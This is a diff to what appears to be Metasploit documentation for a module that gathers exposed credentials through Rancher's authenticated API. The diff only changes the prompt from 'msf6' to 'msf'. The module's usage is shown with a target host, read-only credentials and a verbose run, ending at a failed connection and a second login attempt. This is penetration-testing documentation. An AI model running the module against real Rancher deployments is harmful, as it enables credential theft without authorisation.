@@ -79,22 +79,22 @@ Password for Rancher.
 ### Docker Image
 
 ```
-msf6 > use auxiliary/gather/rancher_authenticated_api_cred_exposure 
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set rhosts rancher.178.62.209.204.sslip.io
+msf > use auxiliary/gather/rancher_authenticated_api_cred_exposure 
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > set rhosts rancher.178.62.209.204.sslip.io
 rhosts => rancher.178.62.209.204.sslip.io
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set username readonlyuser
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > set username readonlyuser
 username => readonlyuser
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set password readonlyuserreadonlyuser
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > set password readonlyuserreadonlyuser
 password => readonlyuserreadonlyuser
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set verbose true
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > set verbose true
 verbose => true
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
 [*] Running module against 178.62.209.204
 
 [*] Attempting login
 [-] Auxiliary aborted due to failure: unreachable: 178.62.209.204:443 - Could not connect to web service - no response
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
+msf auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
 [*] Running module against 178.62.209.204
 
 [*] Attempting login
